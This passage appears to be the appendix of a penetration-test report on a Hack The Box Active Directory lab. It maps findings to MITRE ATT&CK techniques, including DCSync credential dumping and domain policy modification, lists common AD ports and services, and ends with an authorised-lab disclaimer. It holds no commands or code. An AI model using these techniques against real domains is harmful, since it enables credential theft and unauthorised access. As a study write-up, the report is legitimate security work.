+| [T1484.001](https://attack.mitre.org/techniques/T1484/001/) | Domain Policy Modification | FIND-04 |
+| [T1222.001](https://attack.mitre.org/techniques/T1222/001/) | File and Directory Permissions Modification | FIND-05 |
+| [T1003.006](https://attack.mitre.org/techniques/T1003/006/) | OS Credential Dumping: DCSync | FIND-06 |
+
+---
+
+### D — Port & Service Reference
+
+| Port | Service | Description |
+|------|---------|-------------|
+| 53/tcp | DNS | Active Directory service discovery |
+| 88/tcp | Kerberos | Primary AD authentication protocol |
+| 135/tcp | MSRPC | Windows Remote Procedure Call |
+| 139/tcp | NetBIOS | Legacy SMB communication |
+| 389/tcp | LDAP | Directory service queries |
+| 445/tcp | SMB | File sharing and remote administration |
+| 464/tcp | kpasswd5 | Kerberos password change |
+| 593/tcp | RPC over HTTP | Remote procedure calls over HTTP |
+| 636/tcp | LDAPS | Encrypted LDAP |
+| 3268/tcp | Global Catalog | Forest-wide AD search |
+| 3269/tcp | Global Catalog SSL | Encrypted global catalog |
+
+---
+
+*This report was produced for portfolio and educational purposes based on a Hack The Box lab environment. All findings relate to a controlled, authorised testing environment.*
